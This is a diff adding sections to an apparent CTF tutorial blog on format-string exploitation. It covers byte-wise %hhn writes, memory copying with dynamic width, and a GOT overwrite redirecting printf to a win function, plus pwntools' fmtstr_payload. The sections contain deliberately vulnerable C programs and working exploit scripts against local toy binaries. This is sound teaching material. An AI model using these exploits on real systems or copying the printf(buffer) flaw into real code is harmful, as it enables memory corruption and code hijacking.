@@ -38,7 +38,7 @@ All the exploits, source codes, Makefiles and everything can be found in this [G
             - [Byte-by-byte](#writing-two-bytes-one-at-a-time)
         - [Writing four bytes](#writing-four-bytes)
         - [Writing eight bytes](#writing-eight-bytes)
-    - [Copying Memory](#copy-memory)
+    - [Copying Memory](#copying-memory)
     - [Overwriting GOT Entries](#overwriting-entries-on-the-global-offset-table)
     - [Writing a ROP Chain](#writing-a-rop-chain-using-fsb)
 7. **[Pwntools and other tools](#pwntools-and-other-tools)**
@@ -1268,7 +1268,7 @@ int main() {
         printf("\n[*] Well done!\n");
         return 0;
     }
-    printf("Nope! You wrote %d\n", secret);
+    printf("Nope! You wrote %x\n", secret);
     return 1;
 }
 
@@ -1336,14 +1336,530 @@ Now, if we run this program, we'll see far less output and we can see that it wo
 
 ![alt text](/static/ctf-techs/image-27.png)
 
-We can see that these still are **QUITE** a lot of bytes. So, 
+We can see that these still are **QUITE** a lot of bytes. So, the most efficient method is often writing your payload; one-byte at a time. So, for that, we have the following exploit:
+
+> NOTE: I've explained finding the start offset in this blog many times so I won't be explaining it anymore
+
+##### Writing one-byte-at-a-time
+
+```py:exploit-fsb-write-four-bytes-0x2.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+exe = "./fsb-write-four-bytes"
+elf = context.binary = ELF(exe)
+io = process()
+if args.GDB: gdb.attach(io, "b *main+113")
+
+io.recvuntil(b"@ ")
+secret = int(io.recvline(), 16)
+info("secret @ %#x" % secret)
+
+diff_hhn = lambda i, j: ((i - j) % 256) # (0xFF+1)
+
+start = 12
+payload = f"%{0xef}c%{start}$hhn".encode()
+payload += f"%{diff_hhn(0xbe,0xef)}c%{start+1}$hhn".encode()
+payload += f"%{diff_hhn(0xad,0xbe)}c%{start+2}$hhn".encode()
+payload += f"%{diff_hhn(0xde,0xad)}c%{start+3}$hhn".encode()
+payload += b"|"
+payload += p64(secret)
+payload += p64(secret+1)
+payload += p64(secret+2)
+payload += p64(secret+3)
+
+print(f"[*] Payload ({len(payload)=}) {payload}")
+
+io.sendline(payload)
+io.interactive()
+```
+
+##### Using my custom func_byte_array lambda
+
+Now, we know that we wrote `0xdeadbeef` i.e. only 4-bytes of data, what if our data was more than 10-bytes long, would we manually craft each payload, no, right? Well, for that reason, I have made another lambda function (I know ;-;). This lambda, simply takes in a number, and returns it in an array, where each index is 2-bytes:
+
+```py
+func_byte_array = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
+```
+
+Using this lambda, let's make the exploit use a simple for-loop and write `0xdeadbeef`, byte-by-byte. The final exploit for that becomes:
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+exe = "./fsb-write-four-bytes"
+elf = context.binary = ELF(exe)
+io = process()
+if args.GDB: gdb.attach(io, "b *main+113")
+
+io.recvuntil(b"@ ")
+secret = int(io.recvline(), 16)
+info("secret @ %#x" % secret)
+
+func_byte_array  = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
+diff_hhn = lambda i, j: ((i - j) % 256) # (0xFF+1)
+
+start = 12
+data = func_byte_array(0xdeadbeef)
+
+# Writing 0xdeadbeef
+payload = f"%{data[0]}c%{start}$hhn"
+for i in range(1, len(data)):
+    payload += f"%{diff_hhn(data[i], data[i-1])}c%{start+i}$hhn"
+
+# Padding
+payload = payload.encode() + b"|"
+
+# Writing the address:
+for i in range(len(data)):
+    payload += p64(secret+i)
+
+print(f"[*] Payload ({len(payload)=}) {payload}")
+
+io.sendline(payload)
+io.interactive()
+```
+
+Now, in this scenario, our exploit has become far more readable, and can scale easily if we want to write many bytes.
 
 #### Writing Eight Bytes
 
-### Copy Memory
+Now, similar to all others, we can *technically* write `8-bytes` using the `%lln` specifier, however, the number of bytes that'll be printed will simply be too much and clobber the screen. Even `4-bytes` will be too much as well, so; we'll just focus specifically on writing using `%hn` and `%hhn`.
+
+For this, we'll use the following source code:
+
+```c:fsb-write-eight-bytes.c
+// gcc -o fsb-write-eight-bytes fsb-write-eight-bytes.c -w -no-pie
+
+#include <stdio.h>
+#include <stdlib.h>
+
+long secret = 0;
+
+int main() {
+
+    char buffer[0x100];
+
+    printf("=> secret @ %p\n", &secret);
+    printf("What is your name? ");
+    fgets(buffer, 0x100, stdin);
+
+    printf(buffer);
+
+    if(secret == 0xdeadbeefdeadbeef) {
+        printf("\n[*] Well done!\n");
+        return 0;
+    }
+    printf("Nope! You wrote %llx\n", secret);
+    return 1;
+}
+```
+
+Now, similar to the one-byte `func_byte_array` lambda, I wrote another lambda that can be used to write `2-bytes` at a  time:
+
+```py
+func_byte_array_hn  = lambda func_addr: [(func_addr >> (16 * i)) & 0xFFFF for i in range((func_addr.bit_length() + 7) // 16)]
+```
+
+Now, for the two bytes, the exploit will look something like this:
+
+```py:exploit-fsb-write-eight-bytes-0x0.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+exe = "./fsb-write-eight-bytes"
+elf = context.binary = ELF(exe)
+io = process()
+if args.GDB: gdb.attach(io, "b *main+113")
+
+io.recvuntil(b"@ ")
+secret = int(io.recvline(), 16)
+info("secret @ %#x" % secret)
+
+func_byte_array_hn  = lambda func_addr: [(func_addr >> (16 * i)) & 0xFFFF for i in range((func_addr.bit_length() + 7) // 16)]
+diff_hn = lambda i, j: ((i - j) % 65536) # (0xFF+1)
+
+start = 13
+data = func_byte_array_hn(0xdeadbeefdeadbeef)
+
+# # Writing 0xdeadbeefdeadbeef
+payload = f"%{data[0]}c%{start}$hn"
+for i in range(1, len(data)):
+    payload += f"%{diff_hn(data[i], data[i-1])}c%{start+i}$hn"
+
+# Padding
+payload = payload.encode() + b"||||||"
+
+# Writing the address:
+for i in range(0, len(data)):
+    payload += p64(secret+(i*2))
+
+print(f"[*] Payload ({len(payload)=}) {payload}")
+
+io.sendline(payload)
+io.interactive()
+```
+
+The exploit is pretty straight forward. We're simply getting the `0xdeadbeefdeadbeef` as an array, i.e. `[0xbeef, 0xdead, 0xbeef, 0xdead]` and then we're simply writing that at every other 2nd byte on the secret address.
+
+Even though this exploit works, as usual; it clobbers the stdout with tons and tons of whitespaces. Therefore, the best solution in this case too, is writing the data, byte-by-byte. So, the exploit for that will be:
+
+```py:exploit-fsb-write-eight-bytes-0x1.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+exe = "./fsb-write-eight-bytes"
+elf = context.binary = ELF(exe)
+io = process()
+if args.GDB: gdb.attach(io, "b *main+113")
+
+io.recvuntil(b"@ ")
+secret = int(io.recvline(), 16)
+info("secret @ %#x" % secret)
+
+diff_hhn = lambda i, j: (( i - j) % 256)
+func_byte_array_hhn = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
+
+start = 18
+data = func_byte_array_hhn(0xdeadbeefdeadbeef)
+
+# # Writing 0xdeadbeefdeadbeef
+payload = f"%{data[0]}c%{start}$hhn"
+for i in range(1, len(data)):
+    payload += f"%{diff_hhn(data[i], data[i-1])}c%{start+i}$hhn"
+
+# Padding
+payload = payload.encode() + b"|||"
+
+# Writing the address:
+for i in range(0, len(data)):
+    payload += p64(secret+i)
+
+print(f"[*] Payload ({len(payload)=}) {payload}")
+
+io.sendline(payload)
+io.interactive()
+```
+
+Now, when we run this payload, we can easily see the difference, of when we wrote 2-bytes at a time, and when we wrote 1-byte at a time.
+
+> In some scenarios, where we have a limited input, we rely on 2-bytes write (often known as short-writes).
+
+### Copying Memory
+
+Now, in all of the previous tasks where we wrote data, we always knew the value we needed to write. What if, the value that we needed to write, wasn't known to us? In that scenario, we can use `printf` to copy memory from an arbitrary location to another arbitrary location.
+
+In printf, we have been specifying a padding size, `%10c` or something like this, but; there exists dynamic padding size i.e. `*`. This represents that the padding will be passed on a certain value that is stored at an offset defined. Let's consider the following payload as an example:
+
+```c
+%*10$c%11$n
+```
+
+Now, what is happening in this case is, firstly, `printf` will get the `10th` parameter, and then it will use it as a padding size by simply outputting whitespaces. Then, we'll get the `11th` parameter and write that many bytes. What this does is make a direct copy of data, from the `10th` parameter, to the `11th`.
+
+Now, one problem is, even though we can control the specifier and how many bytes we can write, but unlike previous technique, we cannot control how many bytes of padding we do, so, suppose if the data we're supposed to copy is more than 4-bytes long, it will take us a very long time and output tons and tons of values. So, realistically, this apporoach is only helpful if we're trying to copy over a small amount of data. Let's consider the following program:
+
+```c:fsb-memory-copy.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int secret = 0;
+
+int main() {
+
+    // Generating a random 2-byte number everytime
+    srand(time(NULL));
+    long random = rand() % (1 << 16);
+
+    char buffer[0x100] = { 0 };
+
+    printf("How can I help you? ");
+    fgets(buffer, 0x100, stdin);
+
+    printf(buffer);
+
+    printf("Secret: %u\n", secret);
+    printf("Random: %u\n", random);
+
+    if(secret == random) {
+        printf("You are a good pwner now!\n");
+        return 0;
+    }
+
+    printf("You still have a lot to learn...\n");
+    return 1;
+
+}
+```
+
+Now, in this scenario, all we have is a single printf, through which we can either leak or write. But, using the dynamic padding size, we can do both.
+
+So, to approach this problem, we need to identify two things:
+
+- The start offset of our format string
+- The offset at which `random` exists
+
+We have already done the start offset portion quite a lot now. You can refer [here](#identifying-the-format-string-start-offset). So, we need to identify the offset at which `random` exists. We can use the `generate_fmt` function to generate the format string. Also, in our program, once we enter the payload and get the output, we also get to know in the output the value of random, so we also have something to double check against.
+
+> In CTFs, if we do not have a value, we can attach a debugger to an instance and then try and find the value.
+
+![alt text](/static/ctf-techs/image-29.png)
+
+We can see that the start of our format string is 8, and in this instance, the value that we want to set is at index 7. So, our payload will look quite similar to the one we have already seen as an example, i.e.
+
+```py
+payload = b"%*7$c"
+```
+
+What this portion will do is simply get the value which is `7th` parameter and print that many `whitespaces`. Now, we need to specify the address where we want to written to, however; this time we do not have a leak. For this, we can use either `pwntools' ELF` class or use `objdump` to find out.
+
+> NOTE: This works because PIE is not set on this binary. If PIE were set, we'd need a leak or something because the address would be random each time.
+
+Now, using objdump, we can find out the address of secret:
+
+```bash:Terminal
+objdump -x fsb-memory-copy | grep secret
+```
+
+```txt:stdout
+000000000040406c g     O .bss   0000000000000004              secret
+```
+
+Now, we can also extract this address using Pwntools' `ELF` class:
+
+```py
+exe = "./fsb-memory-copy"
+elf = context.binary = ELF(exe)
+secret = elf.sym.secret
+info("secret @ %#x" % secret)
+```
+
+Now, we know that the random value is at `%7`, and our format string starts at `8`, the final payload will become:
+
+```py
+payload = b"%*7$c%8$n" + p64(secret)
+```
+
+However, since the length of the payload is i.e.`%*7$c%8$n` is 9, we'll need to add `7-bytes` of padding and that'll become total of `16-bytes` written, therefore the offset will become 10. However, due to the offset becoming 10, we'll have to get rid of `1-byte` of padding because the lenght of the payload will become `17`, instead of `16`. What I mean is:
+
+`%*7$c%10$n|||||||` is 17 bytes, so we'll get rid of `|` and get `16-bytes` of working payload. The final exploit becomes:
+
+```py:exploit-fsb-memory-copy.py
+#!/usr/bin/env python3
+# Author: @TheFlash2k
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+exe = "./fsb-memory-copy"
+elf = context.binary = ELF(exe)
+secret = elf.sym.secret
+info("secret @ %#x" % secret)
+
+io = process()
+if args.GDB: gdb.attach(io, "b *main+441")
+
+payload = b"%*7$c%10$n||||||" + p64(secret)
+
+io.sendline(payload)
+io.interactive()
+```
+
+Upon running the exploit, we get:
+
+![alt text](/static/ctf-techs/image-30.png)
+
+Now, in this scenario, we get `0x190`, which is a small value. But, imagine if we get a value such 0xffff. It is a pretty large value and it will clobber the stdout, and if we get a number that is more than 4-bytes, well; we can't do much in that regard. Therefore, this technique is not often taught when talking about format strings.
 
 ### Overwriting Entries on the Global Offset Table
 
-### Writing a ROP Chain using FSB
+I won't talk much about the Global Offset Table, Procedure Linkage Table or Lazy Binding. But, just for basic understanding, consider Global Offset Table (GOT) as a lookup table that the program uses to store addresses to the functions that exist in a Library or some place else. **Relocation Read-Only**, also known as RELRO, marks this table as READ-ONLY. Meaning, that upon start of the program, all the function addresses are resolved and stored in the table and table is set to READ-ONLY. However, in `Partial RELRO`, upon each function call, `dl_runtime_resolve` is called, which resolves the functions' addresses from the library, and then updates the entry within the `GOT`.
+
+For better understanding, you can refer to the following blogs:
+
+[AngelBoy's Slides](https://www.slideshare.net/AngelBoy1/execution-50215114) [ALT](https://4ngelboy.blogspot.com/2016/10/execution-of-elf.html)
+
+[m4tsuri](https://m4tsuri.io/2020/04/03/lazy-loading/)
+
+[ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)
+
+
+Using format strings, we have already seen that we can easily overwrite data at a certain address. So, if a program has `Partial RELRO`, we can easily change the value inside the Global Offset Table and redirect code execution to any place that we desire.
+
+For this example, let's consider the following program:
+
+```c:fsb-got-overwrite.c
+// gcc -o fsb-got-overwrite fsb-got-overwrite.c -w -no-pie
+
+#include <stdio.h>
+#include <stdlib.h>
+
+void win() {
+    puts("Congratulations, you have successfully overwritten the GOT and redirected execution...");
+    printf("CTF{f4k3_fl4g_f0r_73s71ng}\n");
+}
+
+int main() {
+
+    char buffer[0x100];
+
+    while(1) {
+        printf("You may enter whatever you want: ");
+        fgets(buffer, 0x100, stdin);
+        if(strcmp(buffer, "exit\n") == 0)
+            break;
+        printf(buffer);
+    }
+    exit(0);
+}
+```
+
+Now, similar to how we wrote data, let's write a bare-bones exploit that will have GDB debugging setup along with the basic payload structure including the `diff_hhn` and `func_byte_array_hhn` lambdas:
+
+```py:exploit-fsb-got-overwrite.py
+#!/usr/bin/env python3
+# Author: @TheFlash2k
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+diff_hhn = lambda i, j: (( i - j) % 256)
+func_byte_array_hhn = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
+
+exe = "./fsb-got-overwrite"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = process()
+if args.GDB: gdb.attach(io, "b *main+115") # gdb attachment
+
+start = 6
+
+io.interactive()
+```
+
+Now, we have identified that the start of our format string payload is at index `6`. Now, in order to see what the GOT looks like at the time of execution, we can run `got` command inside `pwndbg`:
+
+![alt text](/static/ctf-techs/image-31.png)
+
+We can see that, some of the values have addresses starting with `0x7f`, while others have `0x40`. This is because, the `0x7f` values now point to the addresses of these functions within the library, i.e. in our case, `libc`. Whereas, the functions that have `0x40`, haven't been resolved yet and point to instructions that will perform the address resolution, we can see this by simply checking the instructions at the addresses:
+
+![alt text](/static/ctf-techs/image-32.png)
+
+Okay, so; we can do two kinds of overwrites now:
+
+- Overwrite `printf`
+- Overwrite `exit`
+
+We'll only take a look at `printf`, because the printf function has already been resolved, so therefore, we must know how to write a small value to a place where a larger value is already written. Let's start. In order to get the address where we're going to write; we can use pwntools. By doing `elf.sym.got.printf`, we get the address of `printf` within the global offset table. This is crucial because this is where we're going to write the data. What are we going to write? Well, don't we have a `win` function. We will simply replace the value of `printf` in the global offset table with `win`.
+
+> NOTE: The first value that we're going to write will be with `%lln` specifier. That is because, the `printf`'s resolved value is of `6-bytes` and `win` function will be a `3-byte` address. If we don't overwrite these, our address will contain invalid bytes in the top bytes and therefore will result in `SEG-FAULT`.
+
+Now, the exploit for this will look something like this:
+
+```py:exploit-fsb-got-overwrite.py
+#!/usr/bin/env python3
+# Author: @TheFlash2k
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+diff_hhn = lambda i, j: (( i - j) % 256)
+func_byte_array_hhn = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
+
+exe = "./fsb-got-overwrite"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = process()
+if args.GDB: gdb.attach(io, "b *main+115") # gdb attachment
+
+start = 11
+
+info("win @ %#x" % elf.sym.win)
+info("got.printf @ %#x" % elf.sym.got.printf)
+
+data = func_byte_array_hhn(elf.sym.win)
+
+payload = f"%{data[0]}c%{start}$lln"
+for i in range(1, len(data)):
+    payload += f"%{diff_hhn(data[i], data[i-1])}c%{start+i}$hhn"
+
+# padding:
+payload = payload.encode() + b"||||||"
+
+# writing the address:
+for i in range(len(data)):
+    payload += p64(elf.sym.got.printf+i)
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+Now, running this exploit with GDB, we check the `GOT` before passing the format string:
+
+![alt text](/static/ctf-techs/image-34.png)
+
+Now, after the format string, the `got` is:
+
+![alt text](/static/ctf-techs/image-35.png)
+
+We can see that we overwrote `printf` with win. So, let's continue the execution and see that flag.
+
+![alt text](/static/ctf-techs/image-36.png)
+
+You can do the same technique with overwriting `exit`.
 
 ## Pwntools and other tools
+
+`Pwntools` is one of the most powerful libraries developed for exploitation purposes. Pwntools has made tons of manual functionality and work easy for us. Let's take the [GOT Overwrite](#overwriting-entries-on-the-global-offset-table) as an example. You can see that we had to write tons of for loops, and then build the payload ourselves. What if; there was a function, that simply took the start offset from us, and the data we wanted to write and the address we wanted to write to. Pwntools got you covered. Welcome, `fmtstr_payload`. [fmtstr_payload](https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) is a function that is part of the `FmtStr` class.
+
+According to the pwntools' [docs](https://docs.pwntools.com/en/stable/fmtstr.html)
+
+```py
+pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str
+```
+
+> Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits
+
+Now, in simpler terms; this function simply generates the entire payload for us. If we were to write the exploit for got-overwrite, it would look something like this:
+
+```py:exploit-fsb-got-overwrite-pwntools.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+exe = "./fsb-got-overwrite"
+elf = context.binary = ELF(exe)
+libc = elf.libc
+io = process()
+if args.GDB: gdb.attach(io, "b *main+115") # gdb attachment
+
+start = 6
+payload = fmtstr_payload(start, {elf.sym.got.printf: elf.sym.win})
+io.sendline(payload)
+
+io.interactive()
+```
+
+Well, this function makes our lives much much easier.
+
+There are other helper tools that I have developed and would love to share with you guys:
+
+- [fmt-generator](https://gist.github.com/TheFlash2k/2ee4650c3fc850caceb558ef82fa9bd6)
+    This is a command line utility that can be used to generate format string patterns. Also, there is a function that can be used within your scripts to ease the format string generation for reads.
+
+- [fmt_fuzz_all](https://gist.github.com/TheFlash2k/4767efe1155dbad6a415230c43ddfe46)
+    A Simple python script that can fuzz specifiers and automatically decode certain specifiers. This can be used for quick and dirty flag reading off of the stack.
+
+---
+
+## Conclusion
+
+I hope all of you had fun reading this detailed blog. I certainly had fun writing this. If I explained something wrong in here, do let me know on twitter/discord/email so I can fix for the readers.
